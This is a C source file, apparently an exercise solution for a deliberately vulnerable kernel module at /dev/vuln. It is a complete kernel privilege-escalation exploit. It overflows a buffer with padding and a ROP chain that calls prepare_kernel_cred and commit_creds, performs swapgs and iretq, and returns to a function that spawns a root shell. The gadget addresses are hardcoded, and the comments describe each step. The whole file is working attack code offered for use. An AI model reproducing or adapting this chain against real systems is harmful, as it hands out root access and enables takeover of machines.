#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>


extern void get_regs(void);
unsigned long user_cs;
unsigned long user_ss;
unsigned long user_flags;

#define USTACKSZ 1024
unsigned char __attribute__((aligned(16))) user_stack[USTACKSZ];
unsigned char *user_stack_end = user_stack + USTACKSZ - sizeof(unsigned long);

#define OFFSET (5*8+16)
#define PAYLOAD_LINES 14

#define PAYLOADSZ (OFFSET + PAYLOAD_LINES * sizeof(unsigned long))
char payload[PAYLOADSZ];

void cont()
{
	system("/bin/sh");
	_exit(0);
}

int main()
{
	int fd;
	int i;
	char *p;
	unsigned long *rop;

	get_regs();

	for (p = payload; p < payload + OFFSET; p++) {
		*p = 'A';
	}
	rop = (unsigned long *)p;
	// load NULL into rdi
	*rop++ = 0xffffffff81001c4a; // pop rdi
	*rop++ = 0;
	// "call" prepare_kernel_cred
	*rop++ = 0xffffffff810886d0; // prepare_kernel_cred
	// initialize rdi with 0 for the following add
	*rop++ = 0xffffffff81001c4a; // pop rdi
	*rop++ = 0;
	// copy rax into rdi
	*rop++ = 0xffffffff815a830e; // add rdi, rax
	// "call" commit_creds
	*rop++ = 0xffffffff810887e0; // commit_creds
	// remember that we must call swapgs. Luckily,
	// we can easily find 'swapgs; ret' gadgtes.
	*rop++ = 0xffffffff81abd732; // swapgs
	// now jump to any IRETQ
	// (ropper finds an 'iretq; ret', but we actually
	// don't need the ret here and any iretq is fine)
	*rop++ = 0xffffffff810249f6; // iretq
	// data for the IRETQ (in reverse order this time)
	*rop++ = (unsigned long)&cont;
	*rop++ = user_cs;
    *rop++ = user_flags;
	*rop++ = (unsigned long)user_stack_end;
	*rop++ = user_ss;

	fd = open("/dev/vuln", O_WRONLY);
	if (fd < 0) {
		perror("/dev/vuln");
		exit(1);
	}

	(void)write(fd, payload, PAYLOADSZ);
	printf("If you see this the offset is probably wrong\n");
	exit(1);
}